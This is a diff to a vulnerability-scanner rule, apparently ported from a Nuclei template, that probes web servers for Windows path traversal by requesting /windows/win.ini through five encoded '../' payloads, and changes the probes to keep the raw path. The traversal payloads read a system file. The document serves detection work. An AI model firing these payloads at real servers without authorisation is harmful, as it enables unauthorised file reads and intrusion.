@@ -3,7 +3,7 @@ id: "cortex.community:windows-lfi-fuzzing"
 rule_version: "1.0.0"
 requires:
   engine_api: 1
-  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+  capabilities: ["http.standard.v1", "http.preserve_raw_path.v1", "matchers.basic.v1", "proof.signal.v1"]
 info:
   name: "Windows - Local File Inclusion Fuzzing"
   description: "Fuzzing for /windows/win.ini. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
@@ -19,13 +19,13 @@ steps:
   - id: "probe0"
     request: { method: "GET", path: "/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini" }
   - id: "probe1"
-    request: { method: "GET", path: "/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/windows/win.ini" }
+    request: { method: "GET", path: "/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/windows/win.ini", path_mode: "preserve_raw" }
   - id: "probe2"
-    request: { method: "GET", path: "/..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini" }
+    request: { method: "GET", path: "/..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini", path_mode: "preserve_raw" }
   - id: "probe3"
-    request: { method: "GET", path: "/..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini" }
+    request: { method: "GET", path: "/..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini", path_mode: "preserve_raw" }
   - id: "probe4"
-    request: { method: "GET", path: "/../../../../../../windows/win.ini" }
+    request: { method: "GET", path: "/../../../../../../windows/win.ini", path_mode: "preserve_raw" }
 proof:
   kind: "signal.v1"
   assertions:
